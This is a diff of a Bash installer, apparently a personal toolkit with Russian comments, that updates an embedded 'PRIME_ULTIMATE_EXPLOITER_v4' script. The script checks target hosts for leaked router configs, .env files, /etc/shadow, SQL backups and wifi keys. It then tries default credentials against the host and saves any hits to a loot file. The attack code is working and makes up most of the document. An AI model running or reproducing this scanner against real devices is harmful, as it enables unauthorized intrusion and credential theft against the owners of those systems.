@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="32.6"
+CURRENT_VERSION="32.7"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -926,63 +926,79 @@ run_pwd_gen() {
 
 generate_prime_ultimate_exploiter_v4() {
     local target_file="$1"
+    # Используем одинарные кавычки 'EOF', чтобы содержимое записывалось "как есть"
     local code=$(cat << 'EOF'
 #!/bin/bash
-# PRIME_ULTIMATE_EXPLOITER_v4 (Final Absolute Stable)
+# PRIME_ULTIMATE_EXPLOITER_v4 (Final Absolute Stable Edition)
+
 TARGET="$1"
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
 echo "--------------------------------------------------"
-echo -e "\e[1;31m>> INITIATING ATTACK: $TARGET\e[0m"
+echo -e "\e[1;31m>> INITIATING ATTACK VECTOR: $TARGET\e[0m"
 echo "--------------------------------------------------"
 
-# Твои векторы и креды
-VECTORS=(
-    "/cgi-bin/config.exp:sysPassword" 
-    "/rom-0:tplink" 
-    "/.env:DB_PASSWORD" 
+# 1. ВЕКТОРЫ УТЕЧЕК (Безопасный формат через двоеточие)
+# Путь:Ключевое_слово
+V_LIST=(
+    "/cgi-bin/config.exp:sysPassword"
+    "/rom-0:tplink"
+    "/.env:DB_PASSWORD"
+    "/wp-content/debug.log:WP_User"
+    "/backup.sql:INSERT INTO"
     "/etc/shadow:root:"
+    "/get_set.cgi?get=wifi_settings:wireless_key"
 )
-CREDS=(
-    "admin:admin" 
-    "admin:password" 
-    "root:root" 
+
+# 2. ЭВРИСТИЧЕСКИЕ КРЕДЫ
+C_LIST=(
+    "admin:admin"
+    "admin:password"
+    "root:root"
     "telecomadmin:admintelecom"
+    "ubnt:ubnt"
 )
 
 for proto in "http" "https"; do
-    URL="${proto}://${TARGET}/"
+    BASE_URL="${proto}://${TARGET}"
     
-    # Сверхстабильный парсинг кода (без лишних пайпов)
-    RESP=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null | head -n1)
-    CODE=$(echo "$RESP" | grep -oE '[0-9]{3}' | head -n1)
-    CODE=${CODE:-000}
+    # Сверхстабильный парсинг кода ответа (устраняет ошибки 957/1019)
+    # Получаем заголовок и извлекаем цифры через grep
+    RAW_HEAD=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$BASE_URL/" 2>/dev/null | head -n1)
+    CODE=$(echo "$RAW_HEAD" | grep -oE '[0-9]{3}' | head -n1)
+    
+    # Если код не получен, считаем его 000
+    [[ -z "$CODE" ]] && CODE="000"
 
     if [[ "$CODE" == "200" || "$CODE" == "401" || "$CODE" == "302" ]]; then
-        echo -e "\e[1;34m[*] TARGET ALIVE:\e[0m $URL [$CODE]"
-        
-        # А. Эксплойты
-        for vec in "${VECTORS[@]}"; do
-            # Используем cut - максимально просто
-            V_PATH=$(echo "$vec" | cut -d':' -f1)
-            V_KEY=$(echo "$vec" | cut -d':' -f2)
+        echo -e "\e[1;34m[*] TARGET ALIVE:\e[0m $BASE_URL [$CODE]"
+
+        # А. Проверка прямых эксплойтов
+        for item in "${V_LIST[@]}"; do
+            # Разделяем путь и ключ через cut (самый стабильный метод)
+            V_PATH=$(echo "$item" | cut -d':' -f1)
+            V_KEY=$(echo "$item" | cut -d':' -f2)
             
-            FULL_V_URL="${proto}://${TARGET}${V_PATH}"
-            if curl -sL -k -A "$UA" --max-time 3 "$FULL_V_URL" 2>/dev/null | grep -q "$V_KEY"; then
+            CHECK_URL="${BASE_URL}${V_PATH}"
+            # Проверка контента на наличие ключа
+            if curl -sL -k -A "$UA" --max-time 3 "$CHECK_URL" 2>/dev/null | grep -q "$V_KEY"; then
                 echo -e "    \e[1;31m[!!!] EXPLOIT SUCCESS: $V_KEY FOUND\e[0m"
-                echo "[EXPLOIT] $FULL_V_URL | $V_KEY" >> /root/prime_loot_full.txt
+                echo "[EXPLOIT] $CHECK_URL | $V_KEY" >> /root/prime_loot_full.txt
             fi
         done
-        
-        # Б. Брутфорс
-        for pair in "${CREDS[@]}"; do
-            U=$(echo "$pair" | cut -d':' -f1)
-            P=$(echo "$pair" | cut -d':' -f2)
+
+        # Б. Интеллектуальный брутфорс
+        echo -e "    \e[1;36m[>] Testing credentials...\e[0m"
+        for pair in "${C_LIST[@]}"; do
+            U_NAME=$(echo "$pair" | cut -d':' -f1)
+            U_PASS=$(echo "$pair" | cut -d':' -f2)
             
-            R=$(curl -sL -k -u "$U:$P" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL")
-            if [[ "$R" == "200" ]]; then
-                echo -e "    \e[1;32m[!!!] AUTH MATCH: $U:$P\e[0m"
-                echo "[AUTH] $U:$P @ $URL" >> /root/prime_loot_full.txt
+            # Проверка авторизации через код ответа
+            BRUTE_RES=$(curl -sL -k -u "$U_NAME:$U_PASS" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$BASE_URL/")
+            
+            if [[ "$BRUTE_RES" == "200" ]]; then
+                echo -e "    \e[1;32m[!!!] AUTH MATCH: $U_NAME:$U_PASS\e[0m"
+                echo "[AUTH] $U_NAME:$U_PASS @ $BASE_URL" >> /root/prime_loot_full.txt
                 break
             fi
         done
@@ -991,10 +1007,11 @@ done
 echo "--------------------------------------------------"
 EOF
 )
-    # Запись через printf исключает "обрезание" или потерю кода
+    # Используем printf для гарантированной записи без искажений (решает проблему "пустых файлов")
     printf "%s\n" "$code" > "$target_file"
     chmod +x "$target_file"
 }
+
 
 
 
@@ -1116,7 +1133,7 @@ update_module "/root/share_server.py" "1.2" generate_share_server_code "File-Sha
 update_module "/root/upload_server.py"  "1.2" generate_upload_server_code  "Inbound-Drop-Box"
 
 # --- ВЫЗОВ В ИНСТАЛЛЕРЕ ---
-update_module "/root/launcher.sh" "32.5" generate_launcher_code "Prime-Launcher"
+update_module "/root/launcher.sh" "32.6" generate_launcher_code "Prime-Launcher"
 chmod +x /root/launcher.sh
 ln -sf /root/launcher.sh /usr/local/bin/launcher
 repair_and_clean
